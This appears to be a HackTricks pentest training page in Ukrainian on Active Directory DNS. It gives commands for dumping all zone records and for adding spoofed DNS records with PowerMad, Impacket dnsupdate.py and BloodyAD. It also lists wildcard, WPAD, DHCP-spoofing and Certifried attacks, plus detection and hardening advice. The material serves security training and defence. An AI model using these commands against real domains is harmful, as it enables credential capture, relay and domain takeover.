# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

За замовчуванням **будь-який користувач** в Active Directory може **перерахувати всі DNS записи** в зонах DNS Домену або Лісу, подібно до передачі зони (користувачі можуть перерахувати дочірні об'єкти зони DNS в середовищі AD).

Інструмент [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) дозволяє **перерахування** та **експорт** **всіх DNS записів** у зоні для цілей розвідки внутрішніх мереж.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (квітень 2025) додає JSON/Greppable (`--json`) вивід, багатопотокове DNS-резолюцію та підтримку TLS 1.2/1.3 при прив'язці до LDAPS

Для отримання додаткової інформації читайте [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Створення / Модифікація записів (ADIDNS спуфінг)

Оскільки група **Authenticated Users** за замовчуванням має **Create Child** на DACL зони, будь-який обліковий запис домену (або обліковий запис комп'ютера) може реєструвати додаткові записи. Це можна використовувати для перехоплення трафіку, примусу NTLM реле або навіть повного компрометації домену.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py постачається з Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Загальні атаки

1. **Запис з підстановкою** – `*.<zone>` перетворює сервер AD DNS на відповідь для всієї підприємства, подібно до підробки LLMNR/NBNS. Його можна використовувати для захоплення NTLM хешів або для їх реле до LDAP/SMB.  (Вимагає, щоб WINS-lookup був вимкнений.)
2. **WPAD захоплення** – додайте `wpad` (або **NS** запис, що вказує на хост зловмисника, щоб обійти Global-Query-Block-List) і прозоро проксіруйте вихідні HTTP запити для збору облікових даних.  Microsoft виправив обходи підстановки/DNAME (CVE-2018-8320), але **NS-записи все ще працюють**.
3. **Захоплення застарілого запису** – заявіть IP-адресу, яка раніше належала робочій станції, і відповідний DNS запис все ще буде розв'язуватись, що дозволяє атаки з обмеженою делегацією на основі ресурсів або Shadow-Credentials без втручання в DNS.
4. **DHCP → DNS підробка** – на стандартному розгортанні Windows DHCP+DNS неавтентифікований зловмисник в тій же підмережі може перезаписати будь-який існуючий A запис (включаючи контролери домену), надіславши підроблені DHCP запити, які викликають динамічні оновлення DNS (Akamai “DDSpoof”, 2023).  Це дає можливість атаки "машина посередині" через Kerberos/LDAP і може призвести до повного захоплення домену.
5. **Certifried (CVE-2022-26923)** – змініть `dNSHostName` облікового запису машини, якою ви керуєте, зареєструйте відповідний A запис, а потім запитайте сертифікат на це ім'я, щоб видавати себе за DC. Інструменти, такі як **Certipy** або **BloodyAD**, повністю автоматизують цей процес.

---

## Виявлення та зміцнення

* Відмовте **Аутентифікованим Користувачам** право *Створювати всі дочірні об'єкти* на чутливих зонах і делегуйте динамічні оновлення спеціальному обліковому запису, що використовується DHCP.
* Якщо динамічні оновлення необхідні, встановіть зону на **Тільки безпечну** і увімкніть **Захист Імен** в DHCP, щоб лише об'єкт комп'ютера-власника міг перезаписати свій власний запис.
* Моніторте події DNS сервера з ID 257/252 (динамічне оновлення), 770 (передача зони) та записи LDAP до `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Блокуйте небезпечні імена (`wpad`, `isatap`, `*`) з навмисно безпечним записом або через Global Query Block List.
* Тримайте DNS сервери оновленими – наприклад, RCE вразливості CVE-2024-26224 та CVE-2024-26231 досягли **CVSS 9.8** і можуть бути віддалено експлуатовані проти контролерів домену.

## Посилання

* Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, все ще де-факто посилання для атак з підстановкою/WPAD)
* Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Грудень 2023)
{{#include ../../banners/hacktricks-training.md}}
